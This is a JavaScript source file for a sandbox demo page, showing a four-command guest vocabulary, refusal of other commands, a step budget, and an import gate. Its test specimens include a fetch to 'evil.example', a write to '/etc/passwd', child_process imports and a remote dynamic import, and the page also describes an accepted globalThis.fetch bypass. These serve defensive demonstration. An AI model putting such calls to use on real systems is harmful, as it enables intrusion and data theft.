/**
 * Step 7 — the sandbox, stated precisely.
 *
 * Three real, provable guarantees run live on this page: a frozen four-command
 * vocabulary, a runtime refusal that names the command and the permitted set,
 * and an import gate that runs BEFORE a program's body executes. A fourth,
 * bounded execution, is here too.
 *
 * And one thing that is NOT defended, stated as plainly as the rest. It is a
 * recorded, accepted risk written into the runner's own header — this page did
 * not discover it, it repeats it.
 *
 * @module
 */
import { el, input, section, table, callout, note, code } from '../lib/dom.js'
import { sourceFooter } from '../lib/github.js'
import {
    interpret, stepBudget, checkSpecifiers, casOpNames, guestCtx, do_, step, ok,
} from '../lib/engine.js'

/** @import { Step } from '../demo.js' */
/** @import { Effect, OperationMap } from 'functionalscript/fjs/effects/types.js' */
/** @import { Result } from 'functionalscript/fjs/types/result/types.js' */

// ── The operation types this panel runs against ──────────────────────────────
//
// The same four the guest vocabulary permits, spelled here the way
// `fjs/exec/module.f.js` spells its own — a name literal paired with the
// operation's signature.

// Each signature returns a `Result`, and that is 0.46.0's `Operation`
// constraint rather than a local style choice: a runner may decline any
// command, so an operation whose return admitted no error would leave the
// refusal nowhere to go. These four mirror `fjs/guest`'s `CasOp` exactly.

/** @typedef {readonly ['casRead', (a: string) => Result<string, string>]} CasRead */
/** @typedef {readonly ['evoList', (a: string) => Result<string, string>]} EvoList */
/** @typedef {readonly ['evoHead', (a: string) => Result<string, string>]} EvoHead */
/** @typedef {readonly ['evoRevision', (a: string) => Result<string, string>]} EvoRevision */
/** @typedef {CasRead | EvoList | EvoHead | EvoRevision} DemoOp */

/**
 * `do_` narrowed to `casRead`. `do_('casRead')` alone under-constrains its
 * operation parameter to a bare `Operation`; this annotation pins it, the same
 * way `fjs/exec`'s own `readDo` does and for the same reason.
 * @type {(a: string) => Effect<CasRead, string, string>}
 */
const casReadDo = do_('casRead')

/** `do_` narrowed to `evoHead`. @type {(a: string) => Effect<EvoHead, string, string>} */
const evoHeadDo = do_('evoHead')

/**
 * A command name that is NOT in the vocabulary.
 *
 * This mirrors `fjs/exec/module.f.js`'s `unsafeDo` exactly, including the
 * reason it exists there: a program actually typed against the guest
 * vocabulary **cannot construct one of these** — `tsc` stops it — and the
 * runtime refusal this panel demonstrates is the BACKSTOP for a command string
 * that reached the interpreter some other way. Simulating that requires
 * stepping outside the type that makes it impossible, which is the one place
 * the repository's own code does the same thing.
 * @type {(command: string) => (a: string) => Effect<DemoOp, string, string>}
 */
const deniedDo = /** @type {any} */ (do_)

export const id = 'sandbox'
export const kicker = 'Step 7'
export const title = 'Sandbox'
export const beat = 'A stored program can ask for four things. Asking for a fifth is refused by name — and what a program may import is decided before its first line runs.'
export const tier = 'optional'

/**
 * A host map offering exactly the guest vocabulary and nothing else.
 *
 * Each entry returns a marker rather than doing real work: what this page
 * demonstrates is which commands are ADMITTED, not what they compute.
 */
/** @type {OperationMap<DemoOp, Result<string, string>>} */
const hostMap = {
    casRead: hash => ok(`bytes of ${hash}`),
    evoList: subject => ok(`revisions of ${subject}`),
    evoHead: subject => ok(`head of ${subject}`),
    evoRevision: id => ok(`revision ${id}`),
}

/**
 * A chain that never reaches a value. Building it costs nothing — `step`'s
 * deferred case means only INTERPRETING it drives the chain, and the step
 * budget is what bounds that.
 * @type {() => Effect<CasRead, string, string>}
 */
const spin = () => step(casReadDo('x'), spin)

/** The programs the vocabulary panel runs.
 * @type {readonly {
 *   readonly label: string,
 *   readonly source: string,
 *   readonly effect: () => Effect<DemoOp, string, string>,
 * }[]}
 */
const guests = [
    {
        label: 'Reads a stored document',
        source: 'ctx => args => ctx.casRead(\'doc-a\')',
        effect: () => casReadDo('doc-a'),
    },
    {
        label: 'Reads, then asks for the head revision',
        source: 'ctx => args => step(ctx.casRead(\'doc-a\'), () => ctx.evoHead(\'subject-b\'))',
        effect: () => step(casReadDo('doc-a'), () => evoHeadDo('subject-b')),
    },
    {
        label: 'Reads, then asks to fetch a URL',
        source: 'ctx => args => step(ctx.casRead(\'doc-a\'), () => fetch(\'https://evil.example\'))',
        effect: () => step(casReadDo('doc-a'), () => deniedDo('fetch')('https://evil.example')),
    },
    {
        label: 'Reads, then asks to write a file',
        source: 'ctx => args => step(ctx.casRead(\'doc-a\'), () => writeFile(\'/etc/passwd\', …))',
        effect: () => step(casReadDo('doc-a'), () => deniedDo('writeFile')('/etc/passwd')),
    },
    {
        label: 'Never terminates',
        source: 'const spin = () => step(ctx.casRead(\'x\'), spin)',
        effect: spin,
    },
]

/** The import specifiers the gate is asked about.
 * @type {readonly { readonly label: string, readonly source: string }[]}
 */
const specimens = [
    { label: 'No imports at all', source: 'export const report = ctx => args => ctx.casRead(\'x\')' },
    { label: 'Imports the filesystem', source: 'import { readFile } from \'node:fs\'' },
    { label: 'Imports a child process', source: 'import { execSync } from \'node:child_process\'' },
    { label: 'Imports from a URL', source: 'const m = await import(\'https://evil.example/x.js\')' },
    { label: 'A dynamic import it cannot read statically', source: 'const m = await import(whateverTheUserTyped)' },
    { label: 'Redundant parentheses around the specifier', source: 'const m = await import((\'node:fs\'))' },
]

/** @type {Step['render']} */
export const render = root => {
    // ── The vocabulary ───────────────────────────────────────────────────────
    const vocabulary = section(
        'A stored program can ask for exactly four things',
        'Not "four things plus whatever the host happens to expose". Four, frozen at the type level.')
    vocabulary.append(table(
        ['Command', 'What it does'],
        [
            ['casRead', 'Read a document out of the content store, by address'],
            ['evoList', 'List the revisions of a subject'],
            ['evoHead', 'The current revision of a subject'],
            ['evoRevision', 'One specific revision'],
        ],
    ))
    vocabulary.append(el('p', {
        html: `The engine reports its own vocabulary as <code>${casOpNames.join(', ')}</code> — `
            + 'read from the module just now, not typed on this page.',
    }))
    vocabulary.append(code(
        '// the whitelist, as a compile-time assertion\n'
        + 'Assert<Equal<CasOp[0], \'casRead\' | \'evoList\' | \'evoHead\' | \'evoRevision\'>>'))
    vocabulary.append(note(
        'Add a fifth operation and that line stops compiling — the build fails before a '
        + 'single test runs. It also catches a command being REMOVED, which an '
        + '"is fetch forbidden?" style check would miss entirely.'))
    vocabulary.append(el('p', {
        html: `The context a guest receives carries <code>${Object.keys(guestCtx).length}</code> `
            + 'names, but only four of them are commands. The rest are pure '
            + 'composition and money helpers — they build an effect value, they never '
            + 'become an operation.',
    }))
    root.append(vocabulary)

    // ── Live refusal ─────────────────────────────────────────────────────────
    const live = section(
        'Run one',
        'Each program below is interpreted right here against a host map offering exactly those four commands.')
    const results = el('div')
    const runAll = () => {
        results.replaceChildren()
        // Outcome comes SECOND, not last. On the first pass the source column
        // sat between them and pushed both verdict columns off the right edge
        // of a projector — the two columns the panel exists to show.
        const rows = guests.map(guest => {
            const outcome = interpret(hostMap)(guest.effect())
            const ok = outcome[0] === 'ok'
            const verdict = el('span', { class: ok ? 'method' : 'method refuses' })
            verdict.textContent = ok ? 'ran' : 'refused'
            const detail = ok
                ? `dispatched: ${outcome[1][1].map(read => read[0]).join(' → ')}`
                : outcome[1]
            const program = el('div')
            program.append(el('div', { text: guest.label }))
            program.append(el('div', { class: 'mono dim wrap', text: guest.source }))
            return [program, verdict, { text: detail, class: 'mono' }]
        })
        results.append(table(['Program', 'Outcome', 'What came back'], rows, { class: 'runs' }))
    }
    runAll()
    live.append(results)
    live.append(callout('ok', 'The refusal names the command AND the permitted set.',
        'Not "permission denied". A message a caller can act on: here is what you asked '
        + 'for, here is everything you are allowed to ask for.'))
    live.append(callout('ok', `Non-termination is bounded at ${stepBudget.toLocaleString()} steps.`,
        'An effect chain that never reaches a value is refused like a denied command — a '
        + 'returned value, not a hang and not a thrown error. A stored program cannot '
        + 'wedge the runner.'))
    root.append(live)

    // ── The import gate ──────────────────────────────────────────────────────
    const gate = section(
        'What a program may import is decided before it runs',
        'This ordering is the whole point: importing a module executes its body immediately, so a check that runs afterwards has already lost.')

    const gateResults = el('div')
    /** @type {(source: string) => { readonly verdict: HTMLElement, readonly detail: string }} */
    const runGate = source => {
        const outcome = checkSpecifiers([])(source)
        const ok = outcome[0] === 'ok'
        const verdict = el('span', { class: ok ? 'method' : 'method refuses' })
        verdict.textContent = ok ? 'admitted' : 'refused'
        return { verdict, detail: ok ? 'no disallowed specifier' : outcome[1] }
    }
    gateResults.append(table(
        ['Program', 'Verdict', 'Reason'],
        specimens.map(specimen => {
            const outcome = runGate(specimen.source)
            const program = el('div')
            program.append(el('div', { text: specimen.label }))
            program.append(el('div', { class: 'mono dim wrap', text: specimen.source }))
            return [program, outcome.verdict, { text: outcome.detail, class: 'mono' }]
        }),
        { class: 'runs' },
    ))
    gate.append(gateResults)

    // A box the audience can type into — the real gate, live.
    const tryIt = el('div', { class: 'control' })
    tryIt.append(el('label', { text: 'Try it — paste any program' }))
    const box = input()
    box.type = 'text'
    box.value = 'import { spawn } from \'node:child_process\''
    box.style.minWidth = '100%'
    const verdictBox = el('div')
    const check = () => {
        const outcome = runGate(box.value)
        verdictBox.replaceChildren()
        const row = el('div', { class: 'figure-row' })
        row.append(outcome.verdict)
        row.append(el('span', { class: 'mono', text: outcome.detail }))
        verdictBox.append(row)
    }
    box.addEventListener('input', check)
    tryIt.append(box)
    gate.append(tryIt)
    gate.append(verdictBox)
    check()
    gate.append(note(
        'The gate refuses an import it cannot read statically, rather than letting it '
        + 'through. A dynamic specifier is not "probably fine" — it is unknowable at '
        + 'check time, which is the same thing as unsafe.'))
    root.append(gate)

    // ── The boundary ─────────────────────────────────────────────────────────
    const boundary = section('What this does NOT defend against')
    boundary.append(callout('warn', 'A program body that calls globalThis.fetch directly runs with host privileges.',
        'The effect system refuses a program that ASKS for network access through it. '
        + 'It does not stop a program that simply reaches for the host\'s own globals. '
        + 'That is a recorded, accepted risk — written into the runner\'s own header and '
        + 'into the requirements document, not something found while preparing this '
        + 'demo.'))
    boundary.append(el('p', {
        html: 'The honest summary is: <strong>the effect vocabulary is a whitelist, and '
            + 'the import gate runs first. Neither is a JavaScript isolate.</strong> '
            + 'Closing that gap means an isolate or a separate process, and it is not '
            + 'claimed today.',
    }))
    boundary.append(el('p', {
        text: 'We would rather tell you precisely where the line is than describe a '
            + 'sandbox you can poke a hole in during the questions.',
    }))
    root.append(boundary)

    root.append(sourceFooter([
        { label: 'fjs/exec — interpret, the refusal message, and the step budget', path: 'fjs/exec/module.f.js', line: 158, proofLine: 183 },
        { label: 'fjs/guest — the four-command vocabulary and its type assertion', path: 'fjs/guest/module.f.js', line: 139, proofLine: 207 },
        { label: 'fjs/guest/materialize — the import gate, and why it must run first', path: 'fjs/guest/materialize/module.f.js', line: 203, proofLine: 369 },
    ]))
}
